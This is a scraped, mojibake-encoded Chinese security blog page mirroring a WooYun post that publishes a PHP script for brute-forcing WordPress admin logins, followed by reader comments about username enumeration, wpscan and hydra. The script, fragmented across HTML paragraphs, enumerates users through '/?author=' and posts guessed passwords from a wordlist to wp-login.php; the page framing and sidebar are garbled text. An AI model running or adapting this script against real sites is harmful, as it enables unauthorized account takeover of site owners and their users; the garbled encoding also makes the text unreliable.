<p>wordpressæ¡†æ¶è¦æ˜¯èƒ½æ‰¾å‡ºæ¥æ¼æ´ï¼Œä½ å°±å‘äº†ã€‚ã€‚ã€‚</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<h3 id="-">å‘è¡¨è¯„è®º</h3>
<p><a href="">ç‚¹å‡»è¿™é‡Œå–æ¶ˆå›å¤ã€‚</a></p>
<p>æ‚¨å¿…é¡» <a href="http://drops.wooyun.org/login" target="_blank">ç™»é™†</a> åæ‰èƒ½å‘è¡¨è¯„è®ºã€‚</p>
<h3 id="-">è®¢é˜…æ›´æ–°</h3>
<ul>
<li><a href="http://drops.wooyun.org/feed" title="ç‚¹å‡»è®¢é˜…" target="_blank"><img src="" alt=""></a></li>
</ul>
<h3 id="-">åˆ†ç±»</h3>
<ul>
<li><a href="http://drops.wooyun.org/category/papers" title="æ¼æ´åˆ†æ" target="_blank">æ¼æ´åˆ†æ</a> (40)</li>
<li><a href="http://drops.wooyun.org/category/tips" title="æŠ€æœ¯åˆ†äº«" target="_blank">æŠ€æœ¯åˆ†äº«</a> (57)</li>
<li><a href="http://drops.wooyun.org/category/tools" title="å·¥å…·æ”¶é›†" target="_blank">å·¥å…·æ”¶é›†</a> (5)</li>
<li><p><a href="http://drops.wooyun.org/category/news" title="ä¸šç•Œèµ„è®¯" target="_blank">ä¸šç•Œèµ„è®¯</a> (3)</p>
<h3 id="-">æœ€æ–°æ—¥å¿—</h3>
</li>
<li><p><a href="http://drops.wooyun.org/tips/688" title="Flash CSRF" target="_blank">Flash CSRF</a></p>
</li>
<li><a href="http://drops.wooyun.org/tips/689" title="XSSä¸å­—ç¬¦ç¼–ç çš„é‚£äº›äº‹å„¿ â€”ç§‘æ™®æ–‡" target="_blank">XSSä¸å­—ç¬¦ç¼–ç çš„é‚£äº›äº‹å„¿ â€”ç§‘æ™®æ–‡</a></li>
<li><a href="http://drops.wooyun.org/papers/680" title="Zabbix SQL Injection/RCE â€“ CVE-2013-5743" target="_blank">Zabbix SQL Injection/RCE â€“ CVE-2013-5743</a></li>
<li><a href="http://drops.wooyun.org/papers/679" title="CDNæµé‡æ”¾å¤§æ”»å‡»æ€è·¯" target="_blank">CDNæµé‡æ”¾å¤§æ”»å‡»æ€è·¯</a></li>
<li><a href="http://drops.wooyun.org/news/674" title="ä»ä¸ç»¸ä¹‹è·¯åˆ°å®‰å…¨è¿ç»´ï¼ˆOperational Securityï¼‰ä¸é£é™©æ§åˆ¶ï¼ˆRisk Managementï¼‰ ä¸Šé›†" target="_blank">ä»ä¸ç»¸ä¹‹è·¯åˆ°å®‰å…¨è¿ç»´ï¼ˆOperational Securityï¼‰ä¸é£é™©æ§åˆ¶ï¼ˆRisk Managementï¼‰ ä¸Šé›†</a></li>
<li><a href="http://drops.wooyun.org/tips/662" title="æ”»å‡»JavaWebåº”ç”¨[8]-åé—¨ç¯‡" target="_blank">æ”»å‡»JavaWebåº”ç”¨[8]-åé—¨ç¯‡</a></li>
<li><a href="http://drops.wooyun.org/papers/660" title="php4fun.sinaapp.com PHPæŒ‘æˆ˜é€šå…³æ”»ç•¥" target="_blank">php4fun.sinaapp.com PHPæŒ‘æˆ˜é€šå…³æ”»ç•¥</a></li>
<li><a href="http://drops.wooyun.org/papers/653" title="æ­å»ºåŸºäºSuricata+Barnyard2+Baseçš„IDSå‰ç«¯Snorby" target="_blank">æ­å»ºåŸºäºSuricata+Barnyard2+Baseçš„IDSå‰ç«¯Snorby</a></li>
<li><a href="http://drops.wooyun.org/tools/655" title="GPUç ´è§£ç¥å™¨Hashcatä½¿ç”¨ç®€ä»‹" target="_blank">GPUç ´è§£ç¥å™¨Hashcatä½¿ç”¨ç®€ä»‹</a></li>
<li><a href="http://drops.wooyun.org/tips/649" title="å†…ç½‘æ¸—é€åº”ç”¨ è·¨vlanæ¸—é€çš„ä¸€ç§æ€è·¯" target="_blank">å†…ç½‘æ¸—é€åº”ç”¨ è·¨vlanæ¸—é€çš„ä¸€ç§æ€è·¯</a></li>
</ul>
<h3 id="-">æœ€æ–°è¯„è®º</h3>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>c2y2 åœ¨ <a href="http://drops.wooyun.org/tips/689#comment-1883" target="_blank">XSSä¸å­—ç¬¦ç¼–ç çš„é‚£äº›äº‹å„¿ ---ç§‘æ™®æ–‡</a>
è°¢è°¢</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>Evi1c0de åœ¨ <a href="http://drops.wooyun.org/tips/573#comment-1877" target="_blank">å¦‚ä½•ç”¨æ„å¿µè·å–é™„è¿‘ç¾å¥³çš„æ‰‹æœºå·ç </a>
è¿æ¥CMCCè·³è½¬åˆ°ç™»é™†é¡µé¢ å³é”®æºç  ä¿®æ”¹å³å¯</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>ç‰›ç‰› åœ¨ <a href="http://drops.wooyun.org/tips/688#comment-1871" target="_blank">Flash CSRF</a>
æ”¯æŒä¸€ä¸‹å‘µå‘µ</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>luwikes åœ¨ <a href="http://drops.wooyun.org/papers/178#comment-1870" target="_blank">JBosså®‰å…¨é—®é¢˜æ€»ç»“</a>
mark</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>NgInx åœ¨ <a href="http://drops.wooyun.org/tips/688#comment-1869" target="_blank">Flash CSRF</a>
å¥½å§ï¼ŒåŸºä½¬ï¼Œé¡¶ä½ ä¸€ä¸ªï¼Œä¸é”™ã€‚</p>
<ul>
<li><a href="">ä¸‹ä¸€é¡µ Â»</a>
Powered by <a href="http://wordpress.org/" target="_blank">WordPress</a> | GZai Theme by <a href="http://huaidan.org/" title="GZai Theme produced by é¬¼ä»”" target="_blank">é¬¼ä»”</a>
<a href="http://tongji.baidu.com/hm-web/welcome/ico?s=9fc41da6a2322bdd80563c9d5a4bdb1d" target="_blank"><img src="" alt=""></a></li>
</ul>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li></span><span class="breadcrumb"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li><li><a href="/categories/å®‰å…¨/PHP-WordPress/">PHP-WordPress</a></li></span></span> | <span class="tags">Tagged <a href="/tags/PHP-WordPress/" class="label label-primary">PHP-WordPress</a><a href="/tags/å®‰å…¨/" class="label label-success">å®‰å…¨</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-å®‰å…¨-PHP-WordPress--WordPress-361PHPå¯¹è±¡æ³¨å…¥æ¼æ´-WooYunçŸ¥è¯†åº“/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-å®‰å…¨-PHP-WordPress--WordPress-361PHPå¯¹è±¡æ³¨å…¥æ¼æ´-WooYunçŸ¥è¯†åº“" data-count-type="comments">æš‚æ— è¯„è®º</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-å®‰å…¨-PHP-WordPress--è·‘wordpressç”¨æˆ·å¯†ç è„šæœ¬/">è·‘wordpressç”¨æˆ·å¯†ç è„šæœ¬</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-å®‰å…¨-PHP-WordPress--è·‘wordpressç”¨æˆ·å¯†ç è„šæœ¬/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-wordpress-">è·‘wordpressç”¨æˆ·å¯†ç è„šæœ¬</h1>
<h3 id="-">åˆ†äº«åˆ°</h3>
<ul>
<li><a href="">ä¸€é”®åˆ†äº«</a></li>
<li><a href="">QQç©ºé—´</a></li>
<li><a href="">æ–°æµªå¾®åš</a></li>
<li><a href="">ç™¾åº¦äº‘æ”¶è—</a></li>
<li><a href="">äººäººç½‘</a></li>
<li><a href="">è…¾è®¯å¾®åš</a></li>
<li><a href="">ç™¾åº¦ç›¸å†Œ</a></li>
<li><a href="">å¼€å¿ƒç½‘</a></li>
<li><a href="">è…¾è®¯æœ‹å‹</a></li>
<li><a href="">ç™¾åº¦è´´å§</a></li>
<li><a href="">è±†ç“£ç½‘</a></li>
<li><a href="">æœç‹å¾®åš</a></li>
<li><a href="">ç™¾åº¦æ–°é¦–é¡µ</a></li>
<li><a href="">QQå¥½å‹</a></li>
<li><a href="">å’Œè®¯å¾®åš</a></li>
<li><a href="">æ›´å¤š...</a></li>
</ul>
<p><a href="">ç™¾åº¦åˆ†äº«</a></p>
<h1 id="-wooyun-http-drops-wooyun-org-wooyun-"><a href="http://drops.wooyun.org/" title="WooYunçŸ¥è¯†åº“" target="_blank">WooYunçŸ¥è¯†åº“</a></h1>
<p><a href="http://drops.wooyun.org/login" title="ç™»å½•" target="_blank">ç™»å½•</a></p>
<p>åƒä¸€æœµä¹Œäº‘ä¸€æ ·æˆé•¿</p>
<ul>
<li><a href="http://drops.wooyun.org/" title="WooYunçŸ¥è¯†åº“" target="_blank">é¦–é¡µ</a></li>
<li><a href="http://www.wooyun.org/" target="_blank">WooYun</a></li>
<li><a href="http://zone.wooyun.org/" target="_blank">Zone</a></li>
<li><a href="http://drops.wooyun.org/newsend" target="_blank">æŠ•ç¨¿</a>
<a href="http://drops.wooyun.org/" title="é¦–é¡µ" target="_blank">é¦–é¡µ</a> Â» <a href="http://drops.wooyun.org/category/tools" title="æŸ¥çœ‹ å·¥å…·æ”¶é›† ä¸­çš„å…¨éƒ¨æ–‡ç« " target="_blank">å·¥å…·æ”¶é›†</a> Â» è·‘wordpressç”¨æˆ·å¯†ç è„šæœ¬</li>
</ul>
<h2 id="-wordpress-http-drops-wooyun-org-tools-601-permanent-link-to-wordpress-"><a href="http://drops.wooyun.org/tools/601" title="Permanent Link to è·‘wordpressç”¨æˆ·å¯†ç è„šæœ¬" target="_blank">è·‘wordpressç”¨æˆ·å¯†ç è„šæœ¬</a></h2>
<p>4äººæ”¶è— <a href="">æ”¶è—</a></p>
<p>2013/09/17 15:04  | <a href="http://drops.wooyun.org/author/çŒç¡é¾™" title="ç”± çŒç¡é¾™ å‘å¸ƒ" target="_blank">çŒç¡é¾™</a>  | <a href="http://drops.wooyun.org/category/tools" title="æŸ¥çœ‹ å·¥å…·æ”¶é›† ä¸­çš„å…¨éƒ¨æ–‡ç« " target="_blank">å·¥å…·æ”¶é›†</a>  | <a href="">å ä¸ªåº§å…ˆ</a></p>
<p>åœ¨åšæ¸—é€æµ‹è¯•çš„æ—¶å€™ï¼Œæœ‰æ—¶å€™ä¼šé‡åˆ°ä¸€ä¸ªwordpressåšå®¢ï¼Œå¦‚æœç‰ˆæœ¬æ¯”è¾ƒæ–°ï¼Œæ’ä»¶ä¹Ÿæ²¡æœ‰æ¼æ´çš„è¯ï¼Œå¯ä»¥çˆ†ç ´ç”¨æˆ·åå¯†ç æ¥å°è¯•ä¸‹ã€‚</p>
<p>å¤§è„‘æ··æ²Œæƒ…å†µä¸‹å†™çš„ï¼Œæœ‰bugæ¬¢è¿æå‡ºï¼Œç”±äºæ˜¯phpçš„æ‰€ä»¥è·‘èµ·æ¥æ¯”è¾ƒæ…¢ï¼Œä¸‹æ¬¡å‘åŒ…è¿˜æ˜¯è°ƒç”¨å‘½ä»¤ç»“åˆhydraæ¥çˆ†ç ´ã€‚</p>
<p>åŸç†æ˜¯é€šè¿‡URL</p>
<p>/?author=
éå†è·å–ç”¨æˆ·åï¼Œç„¶åå…ˆè·‘ç”¨æˆ·åä¸å¯†ç ç›¸åŒçš„ç”¨æˆ·ï¼Œå†è°ƒç”¨åŒç›®å½•ä¸‹pass.txtä¸­çš„å¯†ç æ–‡ä»¶è¿›è¡Œçˆ†ç ´ã€‚</p>
<p>é»˜è®¤è·å–å‰10ä¸ªç”¨æˆ·ï¼Œå¯è‡ªè¡Œä¿®æ”¹ã€‚</p>
<p>ä½¿ç”¨æ–¹æ³•ï¼š
php wordpress.php <a href="http://www.test.com" target="_blank">http://www.test.com</a></p>
<p>1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
9</p>
<p>10
11</p>
<p>12
13</p>
<p>14
15</p>
<p>16
17</p>
<p>18
19</p>
<p>20
21</p>
<p>22
23</p>
<p>24
25</p>
<p>26
27</p>
<p>28
29</p>
<p>30
31</p>
<p>32
33</p>
<p>34
35</p>
<p>36
37</p>
<p>38
39</p>
<p>40
41</p>
<p>42
43</p>
<p>44
45</p>
<p>46
47</p>
<p>48
49</p>
<p>50
51</p>
<p>52
53</p>
<p>54
55</p>
<p>56
57</p>
<p>58
59</p>
<p>60
61</p>
<p>62
63</p>
<p>64
65</p>
<p>66
67</p>
<p>68
69</p>
<p>70
71</p>
<p>72
73</p>
<p>74
75</p>
<p>76
77</p>
<p>78
79</p>
<p>80
81</p>
<p>82
83</p>
<p>84
&lt;?php</p>
<p>set_time_limit(0);</p>
<p>$domain</p>
<p>=</p>
<p>$argv</p>
<p>[1];</p>
<p>//è·å–ç”¨æˆ·å
for</p>
<p>(</p>
<p>$i</p>
<p>=1;</p>
<p>$i</p>
<p>&lt;= 10;</p>
<p>$i</p>
<p>++) {</p>
<p>$url</p>
<p>=</p>
<p>$domain</p>
<p>.</p>
<p>&quot;/?author=&quot;</p>
<p>.</p>
<p>$i</p>
<p>;</p>
<p>$response</p>
<p>= httprequest(</p>
<p>$url</p>
<p>,0);</p>
<p>if</p>
<p>(</p>
<p>$response</p>
<p>== 404) {</p>
<p>continue</p>
<p>;</p>
<p>}</p>
<p>$pattern</p>
<p>=</p>
<p>&quot;{<title>(./*) |}&quot;</p>
<p>;</p>
<p>preg_match(</p>
<p>$pattern</p>
<p>,</p>
<p>$response</p>
<p>,</p>
<p>$name</p>
<p>);</p>
<p>$namearray</p>
<p>[] =</p>
<p>$name</p>
<p>[1];
}</p>
<p>echo</p>
<p>&quot;å…±è·å–ç”¨æˆ·&quot;</p>
<p>.</p>
<p>count</p>
<p>(</p>
<p>$namearray</p>
<p>).</p>
<p>&quot;åç”¨æˆ·\n&quot;</p>
<p>;</p>
<p>echo</p>
<p>&quot;æ­£åœ¨ç ´è§£ç”¨æˆ·åä¸å¯†ç ç›¸åŒçš„ç”¨æˆ·ï¼š\n&quot;</p>
<p>;</p>
<p>$crackname</p>
<p>= crackpassword(</p>
<p>$namearray</p>
<p>,</p>
<p>&quot;same&quot;</p>
<p>);</p>
<p>$passwords</p>
<p>= file(</p>
<p>&quot;pass.txt&quot;</p>
<p>);</p>
<p>echo</p>
<p>&quot;æ­£åœ¨ç ´è§£å¼±å£ä»¤ç”¨æˆ·ï¼š\n&quot;</p>
<p>;</p>
<p>if</p>
<p>(</p>
<p>$crackname</p>
<p>) {</p>
<p>$namearray</p>
<p>=</p>
<p>array_diff</p>
<p>(</p>
<p>$namearray</p>
<p>,</p>
<p>$crackname</p>
<p>);
}</p>
<p>crackpassword(</p>
<p>$namearray</p>
<p>,</p>
<p>$passwords</p>
<p>);</p>
<p>function</p>
<p>crackpassword(</p>
<p>$namearray</p>
<p>,</p>
<p>$passwords</p>
<p>){</p>
<p>global</p>
<p>$domain</p>
<p>;</p>
<p>$crackname</p>
<p>=</p>
<p>&quot;&quot;</p>
<p>;</p>
<p>foreach</p>
<p>(</p>
<p>$namearray</p>
<p>as</p>
<p>$name</p>
<p>) {</p>
<p>$url</p>
<p>=</p>
<p>$domain</p>
<p>.</p>
<p>&quot;/wp-login.php&quot;</p>
<p>;</p>
<p>if</p>
<p>(</p>
<p>$passwords</p>
<p>==</p>
<p>&quot;same&quot;</p>
<p>) {</p>
<p>$post</p>
<p>=</p>
<p>&quot;log=&quot;</p>
<p>.urlencode(</p>
<p>$name</p>
<p>).</p>
<p>&quot;&amp;pwd=&quot;</p>
<p>.urlencode(</p>
<p>$name</p>
<p>).</p>
<p>&quot;&amp;wp-submit=%E7%99%BB%E5%BD%95&amp;redirect_to=&quot;</p>
<p>.urlencode(</p>
<p>$domain</p>
<p>).</p>
<p>&quot;%2Fwp-admin%2F&amp;testcookie=1&quot;</p>
<p>;</p>
<p>$pos</p>
<p>=</p>
<p>strpos</p>
<p>(httprequest(</p>
<p>$url</p>
<p>,</p>
<p>$post</p>
<p>),</p>
<p>&#39;div id=&quot;login_error&quot;&#39;</p>
<p>);</p>
<p>if</p>
<p>(</p>
<p>$pos</p>
<p>=== false) {</p>
<p>echo</p>
<p>&quot;$name $name&quot;</p>
<p>.</p>
<p>&quot;\n&quot;</p>
<p>;</p>
<p>$crackname</p>
<p>[] =</p>
<p>$name</p>
<p>;</p>
<p>}</p>
<p>}</p>
<p>else</p>
<p>{</p>
<p>foreach</p>
<p>(</p>
<p>$passwords</p>
<p>as</p>
<p>$pass</p>
<p>) {</p>
<p>$post</p>
<p>=</p>
<p>&quot;log=&quot;</p>
<p>.urlencode(</p>
<p>$name</p>
<p>).</p>
<p>&quot;&amp;pwd=&quot;</p>
<p>.urlencode(</p>
<p>$pass</p>
<p>).</p>
<p>&quot;&amp;wp-submit=%E7%99%BB%E5%BD%95&amp;redirect_to=&quot;</p>
<p>.urlencode(</p>
<p>$domain</p>
<p>).</p>
<p>&quot;%2Fwp-admin%2F&amp;testcookie=1&quot;</p>
<p>;</p>
<p>$pos</p>
<p>=</p>
<p>strpos</p>
<p>(httprequest(</p>
<p>$url</p>
<p>,</p>
<p>$post</p>
<p>),</p>
<p>&#39;div id=&quot;login_error&quot;&#39;</p>
<p>);</p>
<p>if</p>
<p>(</p>
<p>$pos</p>
<p>=== false) {</p>
<p>echo</p>
<p>&quot;$name $pass&quot;</p>
<p>.</p>
<p>&quot;\n&quot;</p>
<p>;</p>
<p>}</p>
<p>}</p>
<p>}</p>
<p>}</p>
<p>return</p>
<p>$crackname</p>
<p>;</p>
<p>}</p>
<p>function</p>
<p>httprequest(</p>
<p>$url</p>
<p>,</p>
<p>$post</p>
<p>){</p>
<p>$ch</p>
<p>= curl_init();</p>
<p>curl_setopt(</p>
<p>$ch</p>
<p>, CURLOPT_URL,</p>
<p>&quot;$url&quot;</p>
<p>);</p>
<p>curl_setopt(</p>
<p>$ch</p>
<p>, CURLOPT_RETURNTRANSFER, 1);</p>
<p>curl_setopt(</p>
<p>$ch</p>
<p>, CURLOPT_SSL_VERIFYPEER, false);</p>
<p>curl_setopt(</p>
<p>$ch</p>
<p>, CURLOPT_FOLLOWLOCATION,1);</p>
<p>if</p>
<p>(</p>
<p>$post</p>
<p>){</p>
<p>curl_setopt(</p>
<p>$ch</p>
<p>, CURLOPT_POST, 1);</p>
<p>//postæäº¤æ–¹å¼</p>
<p>curl_setopt(</p>
<p>$ch</p>
<p>, CURLOPT_POSTFIELDS,</p>
<p>$post</p>
<p>);</p>
<p>}</p>
<p>$output</p>
<p>= curl_exec(</p>
<p>$ch</p>
<p>);</p>
<p>$httpcode</p>
<p>= curl_getinfo(</p>
<p>$ch</p>
<p>,CURLINFO_HTTP_CODE);</p>
<p>curl_close(</p>
<p>$ch</p>
<p>);</p>
<p>if</p>
<p>(</p>
<p>$httpcode</p>
<p>== 404) {</p>
<p>return</p>
<p>404;</p>
<p>}</p>
<p>else</p>
<p>{</p>
<p>return</p>
<p>$output</p>
<p>;</p>
<p>}
}</p>
<p>?&gt;
ç‰ˆæƒå£°æ˜ï¼šæœªç»æˆæƒç¦æ­¢è½¬è½½ <a href="http://drops.wooyun.org/author/çŒç¡é¾™" title="ç”± çŒç¡é¾™ å‘å¸ƒ" target="_blank">çŒç¡é¾™</a>@<a href="http://drops.wooyun.org/" target="_blank">ä¹Œäº‘çŸ¥è¯†åº“</a>
åˆ†äº«åˆ°ï¼š <a href="&quot;åˆ†äº«åˆ°QQç©ºé—´&quot;"></a> <a href="&quot;åˆ†äº«åˆ°æ–°æµªå¾®åš&quot;"></a> <a href="&quot;åˆ†äº«åˆ°è…¾è®¯å¾®åš&quot;"></a> <a href="&quot;åˆ†äº«åˆ°äººäººç½‘&quot;"></a> <a href="&quot;åˆ†äº«åˆ°ç½‘æ˜“å¾®åš&quot;"></a> <a href="&quot;ç´¯è®¡åˆ†äº«0æ¬¡&quot;">0</a></p>
<h3 id="-">ç›¸å…³æ—¥å¿—</h3>
<ul>
<li><a href="http://drops.wooyun.org/papers/660" target="_blank">php4fun.sinaapp.com PHPæŒ‘æˆ˜é€šå…³æ”»ç•¥</a></li>
<li><a href="http://drops.wooyun.org/tools/650" target="_blank">tunnaå·¥å…·ä½¿ç”¨å®ä¾‹</a></li>
<li><a href="http://drops.wooyun.org/tips/411" target="_blank">å„ç§ç¯å¢ƒä¸‹çš„æ¸—é€æµ‹è¯•</a></li>
<li><a href="http://drops.wooyun.org/tools/427" target="_blank">InsightScan:Pythonå¤šçº¿ç¨‹Ping/ç«¯å£æ‰«æ + HTTPæœåŠ¡/APP æ¢æµ‹ï¼Œå¯ç”ŸæˆHydraç”¨çš„IPåˆ—è¡¨</a></li>
<li><a href="http://drops.wooyun.org/tools/655" target="_blank">GPUç ´è§£ç¥å™¨Hashcatä½¿ç”¨ç®€ä»‹</a></li>
<li><a href="http://drops.wooyun.org/tools/515" target="_blank">Zmapè¯¦ç»†ç”¨æˆ·æ‰‹å†Œå’ŒDDOSçš„å¯è¡Œæ€§</a>
ä¸Šä¸€ç¯‡:<a href="http://drops.wooyun.org/papers/598" target="_blank">OAuth 2.0å®‰å…¨æ¡ˆä¾‹å›é¡¾</a></li>
</ul>
<p>ä¸‹ä¸€ç¯‡:<a href="http://drops.wooyun.org/papers/384" target="_blank">å¯¹æŸåˆ›æ–°è·¯ç”±çš„å®‰å…¨æµ‹è¯•</a></p>
<h3 id="-13-rss-2-0-http-drops-wooyun-org-tools-601-feed-trackback-http-drops-wooyun-org-tools-601-trackback-">æ¥¼è¢«æŠ¢äº† 13 å±‚äº†... <a href="">æŠ¢åº§</a>ã€<a href="http://drops.wooyun.org/tools/601/feed" target="_blank">Rss 2.0</a>æˆ–è€… <a href="http://drops.wooyun.org/tools/601/trackback" target="_blank">Trackback</a></h3>
<ul>
<li><img src="" alt=""> erevus | 2013/09/17 15:53 | <a href="">/#</a></li>
</ul>
<p>å¥½ä¸œè¥¿å•Š</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> ç˜¦è›Ÿèˆ | 2013/09/17 16:09 | <a href="">/#</a></li>
</ul>
<p>é¾™å“¥çš„ä¸œè¥¿ä¸€ç›´å¾ˆå®ç”¨~</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> ccSec | 2013/09/17 17:07 | <a href="">/#</a></li>
</ul>
<p>é¾™å“¥å¥½æµé€¼ã€‚</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> å›­é•¿ | 2013/09/17 17:44 | <a href="">/#</a></li>
</ul>
<p>wordpresså¤ªå¼ ç‹‚äº†ï¼Œè¿ä¸ªéªŒè¯ç éƒ½ä¸åŠ ã€‚</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> <a href="http://www.0x50sec.org/" target="_blank">c4rp3nt3r</a> | 2013/09/17 21:37 | <a href="">/#</a></li>
</ul>
<p>æ˜¨å¤©æˆ‘åˆšå¥½ä¹Ÿå†™äº†ä¸€ä¸ªwordpressæšä¸¾ç”¨æˆ·åçš„å°åŠŸèƒ½ï¼Œæ¥¼ä¸»è¿™ä¸ªç¨‹åºé‡Œé¢ï¼Œæšä¸¾ç”¨æˆ·åçš„åœ°æ–¹æœ‰é—®é¢˜ã€‚
ä¸€æ˜¯ é‡Œçš„ç”¨æˆ·åæ˜¯è¯¥ç”¨æˆ·æ˜¾ç¤ºçš„æ—¶å€™çš„åå­—ï¼Œæ¯”å¦‚ ç™»å½•ç”¨æˆ·å adminï¼Œå¯ä»¥è®¾ç½®æˆ Administratoræˆ–è€…ä»€ä¹ˆã€‚è™½ç„¶å¾ˆå¤šæ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œç¡®å®ä¸ä¸¥è°¨ã€‚å¦ä¸€æ–¹é¢wordpressç‰ˆæœ¬æ¯”è¾ƒå¤šï¼Œå„ç§seoæ’ä»¶ä¹Ÿæ¯”è¾ƒå¤šæšä¸¾ç”¨æˆ·åï¼Œåªç”¨é‡Œçš„ä¿¡æ¯è²Œä¼¼å¾ˆä¸å¤Ÿï¼Œ
è¿˜æœ‰ &lt;body class=&quot;archive author
ä»¥åŠ <a href="http://site/author/admin/" target="_blank"><a href="http://site/author/admin/">http://site/author/admin/</a></a>
è¿™ç§ç­‰ç­‰ã€‚
äº¤æµè€Œå·²ï¼Œæ²¡åˆ«çš„æ„æ€ã€‚</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> <a href="http://www.0x50sec.org/" target="_blank">c4rp3nt3r</a> | 2013/09/17 21:39 | <a href="">/#</a></li>
</ul>
<p>æˆ‘è§‰å¾—wpscanå°±ä¸é”™ï¼Œé™¤éè‡ªå·±å†™ä¸ªæ‰«æå™¨åŠ å…¥è¿™ä¸ªæ¨¡å—ã€‚å˜¿å˜¿ã€‚ã€‚ã€‚</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> çŒç¡é¾™ | 2013/09/18 11:24 | <a href="">/#</a></li>
</ul>
<p>å“ˆï¼Œçš„ç¡®ï¼Œå¿½ç•¥äº†ç™»å½•ç”¨æˆ·åè·Ÿtitleçš„ç”¨æˆ·åå¯èƒ½ä¸ä¸€æ ·ï¼Œè™½ç„¶è¿™ä¸ªäº§ç”Ÿçš„æƒ…å†µå¾ˆå°‘ã€‚é‚£ä½ ç¨‹åºå–ç”¨æˆ·åï¼Œæ˜¯ä»å“ªé‡Œè·å–çš„å‘¢ï¼Ÿ</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> <a href="http://www.0x50sec.org/" target="_blank">c4rp3nt3r</a> | 2013/09/18 11:44 | <a href="">/#</a></li>
</ul>
<p>æˆ‘ä¸Šé¢éƒ½è¯´äº†å“¦</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> Ivan | 2013/09/18 03:25 | <a href="">/#</a></li>
</ul>
<p>æ”¶è—ä¸‹~</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> xfkxfk | 2013/09/18 13:03 | <a href="">/#</a></li>
</ul>
<p>æœ‰æ—¶å€™/?author=numberçš„ç¡®æ‰¾ä¸åˆ°ï¼Œä¸è¿‡è¿™ä¸ªæ‰¾åˆ°çš„æ¦‚ç‡åˆ°æ—¶æŒºé«˜çš„ï¼Œæ”¯æŒä¸‹</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> insight-labs | 2013/09/20 11:33 | <a href="">/#</a></li>
</ul>
<p>äº²ï¼Œæˆ‘ä¸€ç›´ç”¨hydraçš„http-post-formã€‚è¿˜èƒ½å¤šçº¿ç¨‹</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> luwikes | 2013/09/22 15:18 | <a href="">/#</a></li>
</ul>
<p>87</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> lhshaoren | 2013/09/23 22:28 | <a href="">/#</a></li>
</ul>
<p>è¿˜ä¸é”™</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<h3 id="-">å‘è¡¨è¯„è®º</h3>
<p><a href="">ç‚¹å‡»è¿™é‡Œå–æ¶ˆå›å¤ã€‚</a></p>
<p>æ‚¨å¿…é¡» <a href="http://drops.wooyun.org/login" target="_blank">ç™»é™†</a> åæ‰èƒ½å‘è¡¨è¯„è®ºã€‚</p>
<h3 id="-">è®¢é˜…æ›´æ–°</h3>
<ul>
<li><a href="http://drops.wooyun.org/feed" title="ç‚¹å‡»è®¢é˜…" target="_blank"><img src="" alt=""></a></li>
</ul>
<h3 id="-">åˆ†ç±»</h3>
<ul>
<li><a href="http://drops.wooyun.org/category/papers" title="æ¼æ´åˆ†æ" target="_blank">æ¼æ´åˆ†æ</a> (40)</li>
<li><a href="http://drops.wooyun.org/category/tips" title="æŠ€æœ¯åˆ†äº«" target="_blank">æŠ€æœ¯åˆ†äº«</a> (57)</li>
<li><a href="http://drops.wooyun.org/category/tools" title="å·¥å…·æ”¶é›†" target="_blank">å·¥å…·æ”¶é›†</a> (5)</li>
<li><p><a href="http://drops.wooyun.org/category/news" title="ä¸šç•Œèµ„è®¯" target="_blank">ä¸šç•Œèµ„è®¯</a> (3)</p>
<h3 id="-">æœ€æ–°æ—¥å¿—</h3>
</li>
<li><p><a href="http://drops.wooyun.org/tips/688" title="Flash CSRF" target="_blank">Flash CSRF</a></p>
</li>
